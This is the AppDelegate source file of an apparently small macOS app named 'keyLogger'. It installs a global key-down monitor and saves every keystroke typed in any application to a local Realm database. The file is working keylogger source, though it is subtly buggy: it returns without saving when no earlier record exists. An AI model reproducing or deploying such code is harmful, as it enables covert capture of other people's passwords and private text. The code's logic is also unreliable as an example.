//
//  AppDelegate.swift
//  keyLogger
//
//  Created by m0a on 2015/11/15.
//  Copyright © 2015年 m0a. All rights reserved.
//

import Cocoa
import RealmSwift

@NSApplicationMain
class AppDelegate: NSObject, NSApplicationDelegate {


    
    func applicationDidFinishLaunching(aNotification: NSNotification) {
        // Insert code here to initialize your application
        
        print(Realm.Configuration())
        
        let realm = try! Realm()

        NSEvent.addGlobalMonitorForEventsMatchingMask(.KeyDownMask) { (event) -> Void in
//            print("key event:\(event)")
            
            guard let key = event.characters else {
                print("error dont found. key")
                return;
            }
            // Realmの取得はスレッドごとに１度だけ必要になります
            
            
            
            let log = KeyLogger(value: ["key":key])
            let max = realm.objects(KeyLogger).sorted("id", ascending: true).last
            print(max)
            guard let maxid  =  max?.id  else {
                return
            }
            
            log.id = maxid + 1
            
            
            // トランザクションを開始して、オブジェクトをRealmに追加する
            try! realm.write {
                realm.add(log)
            }
            
            
            
            
        }
        
    
    }

    func applicationWillTerminate(aNotification: NSNotification) {
        // Insert code here to tear down your application
    }


}

